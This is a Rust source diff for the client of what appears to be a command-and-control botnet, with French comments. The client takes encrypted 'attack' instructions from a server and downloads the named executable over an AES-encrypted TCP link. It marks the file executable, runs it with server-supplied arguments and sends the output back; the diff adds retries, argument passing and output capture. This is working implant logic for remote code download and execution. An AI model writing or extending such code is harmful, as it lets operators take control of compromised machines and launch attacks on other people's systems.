@@ -23,6 +23,9 @@ use std::path::Path;
 type Aes128CbcEnc = cbc::Encryptor<aes::Aes128>;
 type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
 
+use std::process::{Command};
+use std::time::Duration;
+
 #[cfg(client_os = "linux")]
 use std::os::unix::fs::PermissionsExt;
 
@@ -41,19 +44,19 @@ struct HandshakeConfJson {
 pub struct DataReceived {
     pub(crate) id: String,
     pub(crate) attack: String,
-    pub(crate) arg1: String,
+    pub(crate) arg1:String,
     pub(crate) arg2:String,
     pub(crate) arg3:String
 }
 
 pub(crate) fn json_to_struct_attack(data: String) -> Result<DataReceived, serde_json::Error> {
-   match serde_json::from_str::<DataReceived>(&data) {
-       Ok(data) => Ok(data),
-       Err(err) => {
-           eprintln!("Error parsing JSON data: {:?}", err);
-           Err(err)
-       }
-   }
+    match serde_json::from_str::<DataReceived>(&data) {
+        Ok(data) => Ok(data),
+        Err(err) => {
+            eprintln!("Error parsing JSON data: {:?}", err);
+            Err(err)
+        }
+    }
 }
 
 fn json_to_struct_handshake_stc(data: String) -> HandshakeConfJson {
@@ -162,14 +165,16 @@ fn receive_encrypted_file_from_server(mut stream: TcpStream,
     symetric_key: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
     iv: GenericArray<u8, typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UInt<typenum::uint::UTerm, typenum::bit::B1>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>, typenum::bit::B0>>,
     size_expected: usize,
-) -> Vec<u8> {
+) -> Result<Vec<u8>, String> {
     // TODO
+
+    stream.set_read_timeout(Some(Duration::new(1, 0)));
 
     let mut buffer = vec![0u8; size_expected];
     let mut data = Vec::new();
 
     println!("[+] start receiving file from server");
-
+    
     match stream.read_exact(&mut buffer) {
         Ok(()) => {
             println!("[+] start receiving file from server");
@@ -180,16 +185,23 @@ fn receive_encrypted_file_from_server(mut stream: TcpStream,
         }
     }
 
+    if data.len() != size_expected{
+        println!("[!] Error reading file from server (taille de fichier reçu diffente de celle attendue)");
+        panic!("Error")
+    }
+    
+    
+
     println!("[+] file received from server");
     // let mut buffer = vec![0u8; data.len() + 16];
     match Aes128CbcDec::new(&symetric_key, &iv).decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buffer){
         Ok(decrypted_data) => { 
-            decrypted_data.to_vec()
+            Ok(decrypted_data.to_vec())
         }
 
         Err(err) => {
             eprintln!("Error decrypting data: {:?}", err);
-            String::new().as_bytes().to_vec()
+            Err(String::new())
 
         }
     }
@@ -231,21 +243,37 @@ fn check_and_request_executable(
         send_encrypted_string_to_server(sender.clone(), file_size.clone(), symetric_key.clone(), iv.clone());
 
 
-        println!("\t\t[+] waiting for file data");
-        let data_file = receive_encrypted_file_from_server(connexion, symetric_key.clone(), iv.clone(), file_size.parse::<usize>().unwrap());
-        println!("\t\t[+] file data received");
+    
+        loop{
+            println!("\t\t[+] waiting for file data");
+            match receive_encrypted_file_from_server(connexion.try_clone()?, symetric_key.clone(), iv.clone(), file_size.parse::<usize>().unwrap()){
+                Ok(data_file) => {
+                    println!("\t\t[+] file data received");
+                    // envoyer le code OK de retour
+                    send_encrypted_string_to_server(sender.clone(), "OK".to_string(),symetric_key.clone(), iv.clone());
+                    
+                    let mut file = File::create(&executable_path)?;
+                    file.write_all(&data_file)?;
 
+                    #[cfg(client_os = "linux")]
+                    {
+                        let metadata = file.metadata()?;
+                        let mut permissions = metadata.permissions();
+                        permissions.set_mode(0o755); // rwxr-xr-x
+                        fs::set_permissions(&executable_path, permissions)?;
+                    }
 
-        let mut file = File::create(&executable_path)?;
-        file.write_all(&data_file)?;
+                    break;
 
-        #[cfg(client_os = "linux")]
-        {
-            let metadata = file.metadata()?;
-            let mut permissions = metadata.permissions();
-            permissions.set_mode(0o755); // rwxr-xr-x
-            fs::set_permissions(&executable_path, permissions)?;
+                }
+                Err(e) => {
+                    send_encrypted_string_to_server(sender.clone(), "KO".to_string(),symetric_key.clone(), iv.clone());
+                    // envoyer le code KO de retour
+                }
+            }
+            thread::sleep(Duration::new(1, 0));
         }
+
 
         println!("\t\t[+] Executable received and stored at {:?}", executable_path);
     } else {
@@ -258,12 +286,13 @@ fn check_and_request_executable(
 
 fn execute_attack(
     attack_name: &str,
+    args: &str,
     sender: &mpsc::Sender<Vec<u8>>,
     receiver: &mpsc::Receiver<Vec<u8>>,
     symetric_key: &GenericArray<u8, typenum::consts::U16>,
     iv: &GenericArray<u8, typenum::consts::U16>,
     connexion: TcpStream
-) -> io::Result<()> {
+) ->  io::Result<String> {
     let executable_dir = "./actions";
 
     check_and_request_executable(attack_name, executable_dir, sender, receiver, symetric_key, iv, connexion)?;
@@ -274,9 +303,28 @@ fn execute_attack(
     #[cfg(client_os = "linux")]
     let executable_path = Path::new(executable_dir).join(attack_name);
 
-    std::process::Command::new(executable_path).arg("10").spawn()?.wait()?;
+    // Run the executable with argument `10` and capture the output
+    println!("[+] Lancement de l'attaque: {}", attack_name);
 
-    Ok(())
+
+    let output = Command::new(&executable_path).arg(&args.trim()).output()?; 
+    println!("output: {:?}", output);
+    println!("{:?}", Command::new(&executable_path).arg(&args.trim()));
+
+    // Check if the command was successful
+    if output.status.success() {
+        // Convert stdout to a string
+        let stdout = String::from_utf8_lossy(&output.stdout).to_string();
+        println!("[+] Attaque Exécutée: {}", attack_name);
+        Ok(stdout)
+    } else {
+        // Convert stderr to a string and return an error
+        let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+        println!("[+] Attaque Exécutée: {}", attack_name);
+        Err(io::Error::new(io::ErrorKind::Other, stderr))
+    }
+
+    
 }
 
 fn main() -> io::Result<()> {
@@ -372,15 +420,20 @@ fn main() -> io::Result<()> {
                 println!("[?] instruction reçue : {}", json_attack.attack);
 
                 let id_attack = json_attack.id;
+                let type_attack = json_attack.attack;
 
                 // println!("Received command: {}", message);
-                match execute_attack(&json_attack.attack, &sender, &receiver, &symetric_key, &iv, connexion3.try_clone().expect("REASON")) {
-                    Ok(_) => {
-                        let response = format!("{{\"status\":\"success\",\"id\":\"{}\"}}", id_attack);
+                println!("neuillllleee {:?}", json_attack.arg1);
+
+                let args = format!("{} {} {}", &json_attack.arg1, &json_attack.arg2, &json_attack.arg3);
+                println!("####{}", args);
+                match execute_attack(type_attack.clone().as_str(), &args , &sender, &receiver, &symetric_key, &iv, connexion3.try_clone().expect("REASON")) {
+                    Ok(output) => {
+                        let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, output);
                         send_encrypted_string_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
                     }
                     Err(e) => {
-                        let response = format!("{{\"status\":\"error\",\"id\":\"{}\",\"error\":\"{}\"}}", id_attack, e);
+                        let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"error\"}}", id_attack, type_attack);
                         send_encrypted_string_to_server(sender.clone(), response, symetric_key.clone(), iv.clone());
                     }
                 }
@@ -400,3 +453,9 @@ fn main() -> io::Result<()> {
         }
     }
 }
+
+
+
+
+
+
